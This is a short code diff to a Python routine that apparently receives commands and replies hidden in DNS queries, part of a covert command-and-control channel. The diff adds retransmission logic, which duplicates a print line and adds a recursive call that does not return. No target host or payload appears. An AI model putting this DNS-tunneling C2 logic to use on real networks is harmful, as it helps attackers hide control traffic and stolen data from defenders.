@@ -45,6 +45,7 @@ def receive_response():
     cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
 
     cloaked_response = cloakedFile #"cloaked.payload"
+    
     decloaked_response = "decloaked_response.txt"
     
     with open(cloaked_response, 'r') as file:
@@ -54,7 +55,11 @@ def receive_response():
         
     # Decloakificare il comando
     print("Decloakifying...")
-    Decloakify(cloaked_response, cipher, decloaked_response)
+    print("Decloakifying...")
+    if Decloakify(cloaked_response, cipher, decloaked_response) == -1:
+        print("Requesting re-trasmission")
+        send_command('rt')
+        receive_response()
 
     # Decrypt command
     with open(decloaked_response, 'r') as file:
@@ -62,6 +67,8 @@ def receive_response():
     #print("encrypted_response: ", encrypted_response)
     response = decrypt_message(encrypted_response, key)
     print('Received response: ',response)
+    if response=='rt':
+        send_command(command)
     
         
 
